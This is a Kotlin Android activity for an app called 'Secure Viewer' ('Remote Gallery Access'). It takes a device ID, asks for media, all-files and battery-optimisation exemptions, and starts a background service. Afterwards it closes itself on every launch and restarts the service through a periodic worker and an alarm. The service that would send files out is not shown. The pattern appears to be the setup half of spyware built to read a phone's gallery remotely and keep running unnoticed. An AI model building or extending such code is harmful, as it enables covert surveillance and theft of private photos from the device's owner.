package com.arman.secureviewer

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.content.pm.PackageManager

import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.content.ContextCompat
import androidx.work.*
import java.util.concurrent.TimeUnit

class MainActivity : ComponentActivity() {

    companion object {




    }

    private lateinit var prefs: SharedPreferences
    private var permissionCallback: (() -> Unit)? = null

    private val permLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { _ -> permissionCallback?.invoke() }

    private val batteryLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { permissionCallback?.invoke() }

    private val storageLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { permissionCallback?.invoke() }



    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        prefs = getSharedPreferences("viewer_prefs", MODE_PRIVATE)


        val savedId = prefs.getString("device_id", "") ?: ""
        if (savedId.isNotEmpty()) {
            // FIX: Service already set up — just ensure it's running and close
            ensureServiceRunning(savedId)
            finish()
            return
        }
        setContent {
            MaterialTheme(
                colorScheme = darkColorScheme(
                    primary = Color(0xFF00BCD4),
                    background = Color(0xFF0A0A0A),
                    surface = Color(0xFF1A1A1A),
                    onBackground = Color.White,
                    onSurface = Color.White
                )
            ) { SetupScreen() }
        }
    }

    @Composable
    fun SetupScreen() {
        var deviceId by remember { mutableStateOf("") }
        var statusMsg by remember { mutableStateOf("Enter Device ID to start") }
        var isRunning by remember { mutableStateOf(false) }

        Surface(modifier = Modifier.fillMaxSize(), color = MaterialTheme.colorScheme.background) {
            Column(
                modifier = Modifier.fillMaxSize().padding(24.dp),
                horizontalAlignment = Alignment.CenterHorizontally,
                verticalArrangement = Arrangement.Center
            ) {
                Text("🔐 Secure Viewer", fontSize = 28.sp, fontWeight = FontWeight.Bold, color = MaterialTheme.colorScheme.primary)
                Spacer(Modifier.height(6.dp))
                Text("Remote Gallery Access", fontSize = 14.sp, color = Color.Gray)
                Spacer(Modifier.height(36.dp))

                Card(modifier = Modifier.fillMaxWidth(), shape = RoundedCornerShape(16.dp),
                    colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surface)) {
                    Column(modifier = Modifier.padding(20.dp), horizontalAlignment = Alignment.CenterHorizontally) {
                        OutlinedTextField(
                            value = deviceId,
                            onValueChange = { deviceId = it },
                            label = { Text("Device ID (e.g. 99)") },
                            modifier = Modifier.fillMaxWidth(), singleLine = true,
                            colors = OutlinedTextFieldDefaults.colors(
                                focusedBorderColor = MaterialTheme.colorScheme.primary,
                                focusedLabelColor = MaterialTheme.colorScheme.primary
                            )
                        )
                        Spacer(Modifier.height(16.dp))
                        Button(
                            onClick = {
                                val id = deviceId.trim()
                                if (id.isBlank()) { statusMsg = "⚠️ Enter Device ID"; return@Button }
                                prefs.edit().putString("device_id", id).apply()
                                statusMsg = "Requesting permissions..."
                                requestAllPermissions {
                                    statusMsg = "✅ Starting service..."
                                    isRunning = true
                                    startViewerService(id)
                                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({ finish() }, 1000)
                                }
                            },
                            modifier = Modifier.fillMaxWidth().height(50.dp),
                            shape = RoundedCornerShape(12.dp),
                            colors = ButtonDefaults.buttonColors(containerColor = MaterialTheme.colorScheme.primary),
                            enabled = !isRunning
                        ) {
                            Text(if (isRunning) "✅ Running" else "Start Service", fontSize = 16.sp, fontWeight = FontWeight.Bold)
                        }
                    }
                }

                Spacer(Modifier.height(16.dp))
                Card(modifier = Modifier.fillMaxWidth(), shape = RoundedCornerShape(12.dp),
                    colors = CardDefaults.cardColors(containerColor = if (isRunning) Color(0xFF1B5E20) else Color(0xFF1A1A1A))) {
                    Text(statusMsg, modifier = Modifier.padding(14.dp).fillMaxWidth(),
                        color = if (isRunning) Color(0xFF81C784) else Color.Gray, textAlign = TextAlign.Center)
                }
            }
        }
    }

    // FIX: Ensure service is running without creating it twice
    private fun ensureServiceRunning(deviceId: String) {
        val intent = Intent(this, ViewerService::class.java).apply { putExtra("device_id", deviceId) }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent)
        else startService(intent)
        scheduleWorker()
        AlarmRestarter.schedule(this)
    }

    private fun startViewerService(deviceId: String) {
        ensureServiceRunning(deviceId)
    }

    private fun requestAllPermissions(onDone: () -> Unit) {
        val perms = mutableListOf<String>()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            perms += listOf(Manifest.permission.READ_MEDIA_IMAGES, Manifest.permission.READ_MEDIA_VIDEO, Manifest.permission.POST_NOTIFICATIONS)
        } else {
            perms += Manifest.permission.READ_EXTERNAL_STORAGE
        }
        val needed = perms.filter { ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED }
        if (needed.isEmpty()) { requestBattery(onDone); return }
        permissionCallback = { requestBattery(onDone) }
        permLauncher.launch(needed.toTypedArray())
    }

    private fun requestBattery(onDone: () -> Unit) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = getSystemService(android.os.PowerManager::class.java)
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                permissionCallback = { requestStorage(onDone) }
                batteryLauncher.launch(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:$packageName")
                })
                return
            }
        }
        requestStorage(onDone)
    }

    private fun requestStorage(onDone: () -> Unit) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !android.os.Environment.isExternalStorageManager()) {
            permissionCallback = onDone
            try {
                storageLauncher.launch(Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                    data = Uri.parse("package:$packageName")
                })
            } catch(e: Exception) { onDone() }
        } else {
            onDone()
        }
    }

    private fun scheduleWorker() {
        val req = PeriodicWorkRequestBuilder<ServiceRestartWorker>(15, TimeUnit.MINUTES)
            .setConstraints(Constraints.Builder().build()).build()
        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            "viewer_worker", ExistingPeriodicWorkPolicy.KEEP, req
        )
    }


}